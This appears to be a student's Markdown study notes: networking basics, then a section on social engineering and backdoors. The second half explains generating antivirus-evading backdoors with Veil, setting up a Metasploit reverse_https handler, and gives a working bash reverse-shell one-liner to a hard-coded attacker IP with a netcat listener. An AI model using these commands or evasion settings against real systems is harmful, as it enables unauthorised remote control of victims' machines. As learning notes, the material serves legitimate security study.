# Pre-security

## Network

Networks are simply things connected.

>The first iteration of the Internet was within the ARPANET project in the late 1960s. This project was funded by the United States Defence Department and was the first documented network in action. However, it wasn't until 1989 when the Internet as we know it was invented by Tim Berners-Lee by the creation of the World Wide Web (WWW). It wasn't until this point that the Internet wasn't used as a repository for storing and sharing information (like it is today).

The Internet is made up of many small networks all joined together.  These small networks are called private networks, where networks connecting these small networks are called public networks -- or the Internet!

### IP - Internet Protocol

an IP address (or Internet Protocol) address can be used as a way of identifying a host on a network for a period of time, where that IP address can then be associated with another device without the IP address changing.

IP Addresses follow a set of standards known as protocols. These protocols are the backbone of networking and force many devices to communicate in the same language, which is something that we'll come onto another time. However, we should recall that devices can be on both a private and public network. Depending on where they are will determine what type of IP address they have: a public or private IP address.

### MAC Addresses

Devices on a network will all have a physical network interface, which is a microchip board found on the device's motherboard. This network interface is assigned a unique address at the factory it was built at, called a MAC (Media Access Control ) address. The MAC address is a twelve-character hexadecimal number (a base sixteen numbering system used in computing to represent numbers) split into two's and separated by a colon. These colons are considered separators. For example, a4:c3:f0:85:ac:2d. The first six characters represent the company that made the network interface, and the last six is a unique number.

However, an interesting thing with MAC addresses is that they can be faked or "spoofed" in a process known as spoofing. This spoofing occurs when a networked device pretends to identify as another using its MAC address. When this occurs, it can often break poorly implemented security designs that assume that devices talking on a network are trustworthy.

### Ping

Ping is one of the most fundamental network tools available to us. Ping uses ICMP (Internet Control Message Protocol) packets to determine the performance of a connection between devices.

The time taken for ICMP packets travelling between devices is measured by ping, such as in the screenshot below. This measuring is done using ICMP's echo packet and then ICMP's echo reply from the target device.

## Local Area Network (LAN) Topologies

**topology**: the design or look of the network at hand.

### Star Topology

The main premise of a star topology is that devices are individually connected via a central networking device such as a switch or hub. This topology is the most commonly found today because of its reliability and scalability - despite the cost.

### Bus Topology

This type of connection relies upon a single connection which is known as a backbone cable.
Because all data destined for each device travels along the same cable, it is very quickly prone to becoming slow and bottlenecked if devices within the topology are simultaneously requesting data. This bottleneck also results in very difficult troubleshooting because it quickly becomes difficult to identify which device is experiencing issues with data all travelling along the same route. bus topologies are one of the easier and more cost-efficient topologies to set up because of their expenses, such as cabling or dedicated networking equipment used to connect these devices.

### Ring Topology

The ring topology (also known as token topology) boasts some similarities. Devices such as computers are connected directly to each other to form a loop, meaning that there is little cabling required and less dependence on dedicated hardware such as within a star topology. 

A ring topology works by sending data across the loop until it reaches the destined device, using other devices along the loop to forward the data. Interestingly, a device will only send received data from another device in this topology if it does not have any to send itself. If the device happens to have data to send, it will send its own data first before sending data from another device.

## Router

It's a router's job to connect networks and pass data between them. It does this by using routing (hence the name router!).

Routing is the label given to the process of data travelling across networks. Routing involves creating a path between networks so that this data can be successfully delivered.

Routing is useful when devices are connected by many paths.

## Switch

Switches are dedicated devices within a network that are designed to aggregate multiple other devices such as computers, printers, or any other networking-capable device using ethernet. These various devices plug into a switch's port. Switches are usually found in larger networks such as businesses, schools, or similar-sized networks, where there are many devices to connect to the network. Switches can connect a large number of devices by having ports of 4, 8, 16, 24, 32, and 64 for devices to plug into.

Unlike Routers, these devices do not perform routing in the sense of directing paths along a certain route using the IP protocol. Instead, Switches use a technology called "packet switching" to break down pieces of data into smaller, more manageable chunks of data called packets. This technology allows for the efficiency of a network because large pieces of data take up more resources -- slowing down a busy network.

# Social Engineering

Social Engineering is the art of manupulating people.

* Hacking target through people.
* target can be: person, company, website etc.
* __Big companiese spend a lot of time and money securing their systems__
* But these systems are managed and used by humans
* Not much is spent on educating employees.

## Information Gathering

* Gather information about target(company/website/person).
* Discover associated webstites,links, companies.
* Associated people, names, emails, phone numbers, social networks, friends.
* Associated social networking accounts.
* display all info on a graph and build attack strategies.

* **maltego** : Best tool for information gathering.

https://www.maltego.com/downloads/

## Backdoor

A backdoor is a file that gives full control over the machine that it gets executed on.
Backdoors can be caught. **Veil** is a framework for generating **Undetectable** backdoors.

https://github.com/Veil-Framework/Veil.git

### Veil - backdoor framework for windows

#### Commands

* **exit** : Completely exit Veil
* **info** : Information on a specific tool
* **list** : List available tools
* **options** : Show Veil configuration
* **update** : Update Veil
* **use** : Use a specific tool

#### Tools

* **Evasion** : Generates undetectable backdoors.  
* **Ordnance** : Generates payloads that used by **Evasion**. A payload is the part of the code of the backdoor that does the evil stuff. It gives us reverse connection, download and execute something on the target computer.

### Veil-Evasion

#### Commands

* **back** : Go to Veil's main menu
* **checkvt** : Check VirusTotal.com against generated hashes
* **clean** : Remove generated artifacts
* **exit** : Completely exit Veil
* **info** : Information on a specific payload
* **list** : List available payloads
* **use** : Use a specific payload

#### Payloads

* **meterpreter** : this payload is designed by **metasploit**. **metasploit** is a huge framework for hacking. The cool thing about **meterpreter** is it runs into memory and it allows us to migrate between system processes so we can have the payload or the backdoor running from a normal process like Explorer for example & this payload will allow us to gain full control over the target computer.

#### Payload: 15) go/meterpreter/rev_https

* **LHOST** : IP of the Metasploit handler. This is the main option. This is the IP address which you're going to be receiving the connections on.
* **LPORT** : Port of the Metasploit handler. 8080 or 80 is less suspicious port.
* **PROCESSORS** : Optional: Minimum number of processors. This is used to look malware different so that it can bypass anti-virus.
* **SLEEP** : Optional: Sleep "Y" seconds, check if accelerated. The malware will sleep for given amount of time before injecting the payload.

Backdoor doesn't open a port in the target machine, rather it actually connects from the target computer to the hacker's computer & by doing that it will bypass firewalls. So we need to open port 8080 or 80 in our machine. **metasploit** framework will be used to listen to this port.

### Metasploit - A huge framework for hacking

This will be used for our backdoor because meterpreter & evasion is also based on metasploit.

```bash
    msfconsole      # running metasploit in terminal
```

#### Modules

**exploit/multi/handler** : This module will allow us to listen to a port.

```bash
    use exploit/multi/handler
```

Then we need to set type of our payload.

```bash
    set PAYLOAD windows/meterpreter/reverse_https   # for windows
```

### Linux machine

Creating a backdoor for linux machine is very simple as it runs on UNIX system thus has bash terminal.

```bash
    # backdoor
    bash -i >& /dev/tcp/192.168.0.106/8080 0>&1

    # ip is for hackers machine
    # this script will run on target/victim machine.
```

Hacker's machine should be listening to the port 8080. To do that runs the following command using ***netcat**.

```bash
    nc -vv -l -p 8080
```

* nc = meaning **netcat**
* -vv = it means verbose standard output.
* -p = port
* -l = listen

# Quotes

> hacking is more about following the law than breaking it.
>
> The essence of hacking is finding unintended or overlooked uses for the
> laws and properties of a given situation and then applying them in new and
> inventive ways to solve a problem.
